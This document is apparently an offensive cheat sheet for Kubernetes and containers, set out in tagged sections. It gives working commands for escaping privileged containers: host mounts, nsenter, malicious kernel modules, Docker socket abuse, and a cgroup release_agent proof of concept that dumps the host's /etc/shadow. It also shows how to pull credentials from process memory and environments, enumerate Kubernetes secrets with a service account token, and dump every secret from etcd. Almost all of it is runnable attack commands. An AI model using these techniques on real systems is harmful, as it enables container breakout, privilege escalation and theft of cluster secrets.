<container_escape>
<privileged_container>
{% raw %}
# Privileged containers have all capabilities
# Can access host resources directly

# Check if running privileged
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff = privileged

# Or check securityContext in pod spec (if accessible)

# Escape techniques from privileged container:

# 1. Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # Adjust device
chroot /mnt/host

# 2. Access host processes
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Enter namespace of PID 1 (host init)

# 3. Load kernel module
insmod /path/to/malicious.ko

# 4. Direct device access
mknod /dev/sda1 b 8 1
mount /dev/sda1 /mnt

# 5. Abuse cgroup release_agent
# (Advanced technique for container escape)
{% endraw %}
</privileged_container>

<hostpath_mounts>
{% raw %}
# hostPath mounts expose host directories

# Check mounted volumes
mount | grep -v 'overlay\|tmpfs\|proc\|sys'
df -h

# Common dangerous mounts:
# /var/run/docker.sock - Docker socket
# /proc - Host proc filesystem
# / - Entire host root
# /etc - Host config
# /var/lib/kubelet - Kubelet data

# Docker socket abuse:
# If /var/run/docker.sock mounted
ls -la /var/run/docker.sock

# List containers on host
docker -H unix:///var/run/docker.sock ps

# Run privileged container on host
docker -H unix:///var/run/docker.sock run -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host

# Or simpler escape:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash

# Host proc mounted:
# If /proc mounted from host
ls -la /proc/*/root  # Access host filesystem via process root dirs
cat /proc/1/root/etc/shadow  # Read host files

# Entire host root mounted:
# If / mounted to /host or similar
chroot /host
# Now operating on host filesystem
{% endraw %}
</hostpath_mounts>

<hostpid_hostnetwork>
{% raw %}
# hostPID allows seeing host processes
# hostNetwork uses host network namespace

# Check if hostPID enabled
ps aux | head
# If shows host processes (not just container) -> hostPID

# With hostPID:
# Can see all host processes
ps aux | grep -i kube
ps aux | grep -i etcd

# Can access /proc of host processes
ls -la /proc/1  # Host init process
cat /proc/1/environ  # Environment of host process
cat /proc/<pid>/cmdline  # Command line of any host process

# Steal credentials from process memory
gdb -p <pid>
(gdb) generate-core-file /tmp/core
# Analyze core dump for secrets

# Or use:
grep -a 'password\|secret\|token' /proc/<pid>/environ

# hostNetwork:
# Container shares host network namespace
# Can sniff traffic
tcpdump -i any -w /tmp/capture.pcap

# Can bind to host ports
nc -l -p 22  # Bind to SSH port on host
{% endraw %}
</hostpid_hostnetwork>

<capability_abuse>
{% raw %}
# Linux capabilities

# Check current capabilities
capsh --print
cat /proc/self/status | grep Cap

# Dangerous capabilities:

# CAP_SYS_ADMIN (almost root)
# Can mount filesystems
mount -t tmpfs none /mnt
mount /dev/sda1 /mnt

# CAP_SYS_PTRACE
# Can ptrace and inject into host processes
gdb -p 1  # Attach to init

# CAP_SYS_MODULE
# Can load kernel modules
insmod malicious.ko

# CAP_DAC_READ_SEARCH
# Bypass file read permission checks
# Can read any file on host (if filesystem mounted)

# CAP_NET_ADMIN
# Network configuration
# Can sniff all traffic

# CAP_SYS_BOOT
# Can reboot host

# Check pod security context for capabilities
# Via API if accessible
{% endraw %}
</capability_abuse>

<cgroup_escape>
{% raw %}
# cgroup release_agent escape (classic container escape)

# Requirements:
# - Privileged container or CAP_SYS_ADMIN
# - cgroup v1

# Technique:
# 1. Create new cgroup
# 2. Set release_agent to malicious script
# 3. Trigger release_agent execution on host

# PoC:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# output file on host will contain /etc/shadow

# Modern kernels have mitigations
# But still works in many environments
{% endraw %}
</cgroup_escape>
</container_escape>

<secrets_enumeration>
<secret_discovery>
{% raw %}
# Find secrets in various locations

# 1. Kubernetes secrets (via API)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# List all secrets in all namespaces (if permitted)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets

# Get specific secret
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets/<secret-name>

# Secrets are base64 encoded in API response
echo "<base64_value>" | base64 -d

# 2. Environment variables
env | grep -i 'password\|secret\|key\|token\|api'

# 3. Mounted secrets
find / -name "*.key" -o -name "*.pem" -o -name "*.crt" 2>/dev/null
find /var/run/secrets -type f 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 4. ConfigMaps (may contain secrets)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/configmaps

# 5. Application config files
find / -name "config.*" -o -name "*.config" -o -name "*.conf" 2>/dev/null | grep -v proc
cat /app/config.yaml
cat /app/.env

# 6. Process command lines (if hostPID)
cat /proc/*/cmdline | strings | grep -i 'password\|secret\|key'

# 7. Process environment (if hostPID)
cat /proc/*/environ | strings | grep -i 'password\|secret\|key'
{% endraw %}
</secret_discovery>

<etcd_access>
{% raw %}
# etcd stores all Kubernetes data (secrets in plaintext)

# etcd is critical target
# Usually on port 2379 (client) and 2380 (peer)

# Check if etcd accessible
curl https://127.0.0.1:2379/version
curl https://<master-ip>:2379/version

# With credentials (if found):
# etcdctl (if available)
export ETCDCTL_API=3
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  get / --prefix --keys-only

# Get all secrets
etcdctl get /registry/secrets --prefix

# Without credentials (if no auth):
curl https://127.0.0.1:2379/v2/keys/registry/secrets

# etcd backup file (may be readable):
# /var/lib/etcd/
# Restore locally to browse secrets
{% endraw %}
</etcd_access>
</secrets_enumeration>

